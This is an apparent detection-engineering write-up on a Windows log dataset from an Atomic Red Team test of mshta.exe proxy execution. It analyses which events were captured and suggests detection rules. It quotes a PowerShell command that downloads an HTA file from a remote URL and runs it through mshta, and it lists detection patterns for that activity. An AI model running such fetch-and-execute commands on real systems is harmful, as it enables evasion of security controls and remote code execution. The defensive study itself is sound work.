# T1218.005-6: Mshta — Invoke HTML Application - Direct download from URI

## Technique Context

T1218.005 (Mshta) is a defense evasion technique where attackers abuse the legitimate Microsoft HTML Application Host (mshta.exe) to proxy execution of malicious code. Mshta.exe is a Windows utility that executes Microsoft HTML Application (.hta) files, which can contain VBScript, JScript, or other scripting languages. Attackers leverage this binary because it's signed by Microsoft, often trusted by application whitelisting solutions, and can execute code from local files or remote URLs.

The detection community focuses on monitoring mshta.exe executions, particularly those involving network connections to download remote HTA files, unusual command-line parameters, and the spawning of child processes that indicate code execution. Key detection opportunities include process creation events for mshta.exe, network connections to suspicious domains, and file creation events for downloaded HTA content.

## What This Dataset Contains

This dataset captures an attempt to execute the Atomic Red Team T1218.005-6 test, which tries to download and execute an HTA file from a remote GitHub URL. The evidence shows:

**PowerShell execution preparing the attack**: Security event 4688 shows PowerShell launching with the command `"powershell.exe" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}`.

**PowerShell script block logging**: Multiple EID 4104 events capture the PowerShell execution, including the main attack command: `Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe`.

**Process creation telemetry**: Sysmon EID 1 events show the creation of child processes including `whoami.exe`, indicating some level of execution occurred within the PowerShell environment.

**Process access events**: Sysmon EID 10 events show PowerShell accessing other processes, suggesting inter-process communication during execution.

**Network-related DLL loading**: Sysmon EID 7 events show PowerShell loading `urlmon.dll`, indicating network functionality was invoked, likely for the remote HTA download attempt.

## What This Dataset Does Not Contain

Critically, this dataset lacks the most important evidence for T1218.005 detection:

**No mshta.exe process creation**: There are no Sysmon EID 1 or Security EID 4688 events showing mshta.exe being spawned. This suggests Windows Defender or another security control blocked the execution before mshta.exe could be launched.

**No network connections**: The dataset contains no Sysmon EID 3 (Network Connection) events showing the actual HTTP request to download the HTA file from GitHub.

**No HTA file creation**: There are no Sysmon EID 11 (File Create) events showing the downloaded HTA file being written to disk.

**No DNS queries**: The dataset lacks Sysmon EID 22 (DNS Query) events that would show the DNS resolution for the GitHub domain.

The absence of these events indicates that while the PowerShell framework executed and attempted to invoke mshta.exe, the actual mshta execution was prevented, likely by Windows Defender's real-time protection blocking the technique before completion.

## Assessment

This dataset provides limited value for building T1218.005 detections because it captures only the preparation phase, not the actual mshta.exe execution. The telemetry is more valuable for detecting PowerShell-based attack frameworks (like Atomic Red Team) rather than the underlying mshta technique itself.

The PowerShell script block logging does provide excellent visibility into the attack command, including the remote HTA URL and the explicit path to mshta.exe. However, for comprehensive T1218.005 detection engineering, you would need datasets containing successful mshta.exe executions with network downloads and HTA file creation.

The process access events and DLL loading patterns could be useful for behavioral detection of PowerShell attempting to invoke system binaries, but they don't constitute strong evidence of the mshta technique specifically.

## Detection Opportunities Present in This Data

1. **PowerShell command-line detection**: Monitor Security EID 4688 for PowerShell processes with command lines containing "mshta" and remote URLs, particularly GitHub raw content URLs.

2. **PowerShell script block monitoring**: Alert on EID 4104 events containing "Invoke-ATHHTMLApplication", "mshta.exe", or "https://raw.githubusercontent.com" patterns indicating Atomic Red Team test execution.

3. **PowerShell network DLL loading**: Detect EID 7 events where PowerShell loads urlmon.dll, which may indicate network download attempts that could precede mshta execution.

4. **Process access anomalies**: Monitor EID 10 events where PowerShell accesses other processes with high privileges (0x1FFFFF), which could indicate preparation for process injection or execution.

5. **Execution policy bypass detection**: Alert on EID 4103 PowerShell module logging showing "Set-ExecutionPolicy -ExecutionPolicy Bypass" as this commonly precedes malicious PowerShell execution.

6. **Atomic Red Team framework detection**: Create signatures for the specific "Invoke-ATHHTMLApplication" function name and GitHub URLs used in this test to identify security testing or potential threat actor use of ART techniques.
